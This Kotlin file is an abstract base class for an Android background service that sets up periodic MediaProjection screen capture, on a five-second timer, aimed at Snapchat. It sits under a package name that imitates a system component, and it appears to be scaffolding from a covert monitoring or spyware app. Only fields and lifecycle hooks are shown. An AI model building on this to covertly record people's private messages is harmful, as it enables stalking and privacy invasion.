package com.android.services.services.snapchat

import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import android.view.Display
import com.android.services.interfaces.IBackgroundProcessing
import java.util.*

/**
 * This is the base [Abstract] Class for SnapChatEventCommandProcessingImpl, Which defines the variables and abstract methods
 * to be Used in the Implementation Class
 */
abstract class SnapChatEventCommandProcessingBaseI(
    val applicationContext: Context
) : IBackgroundProcessing {

    lateinit var mFilePath: String
    internal var mSnapChatEventTimer: Timer? = null
    internal var mMediaProjection: MediaProjection? = null
    internal var mProjectionManager: MediaProjectionManager? = null
    internal var mVirtualDisplay: VirtualDisplay? = null
    internal var mOrientationChangeCallback: SnapChatEventCommandProcessingImplI.OrientationChangeCallback? =
        null
    internal val mHandler by lazy {
        Handler(Looper.getMainLooper())
    }

    internal var mWidth = 0
    internal var mHeight = 0
    internal var mRotation = 0
    internal var mImageReader: ImageReader? = null
    internal var mDensity = 0
    internal var mDisplay: Display? = null
    internal var snapChatEventCounter = 0
    internal var capturedSnapChatEvetns = 0
    internal var filePath: String? = null

    abstract fun initialize()
    abstract fun parseIntent(intent: Intent)
    abstract fun createOutputFilePath(fileName: String): String
    abstract fun startCommand()
    abstract fun onServiceDestroy()

    override fun onCreate() {
        initialize()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startCommand()
        intent?.let {
            parseIntent(intent)
        }
        return Service.START_REDELIVER_INTENT
    }

    override fun onDestroy() {
        onServiceDestroy()
    }

    companion object {
        internal const val TAG = "SnapChatEvent "
        internal const val SCREEN_CAPTURE_NAME = "PRIVATE_SCREEN_CAPTURE"
        internal const val SNAP_CHAT_CAPTURE_INTERVAL = 5000L
        internal const val VIRTUAL_DISPLAY_FLAGS =
            (DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY
                    or DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC)
        const val SNAP_CHAT_NOTIFICATION_ID = 105
    }
}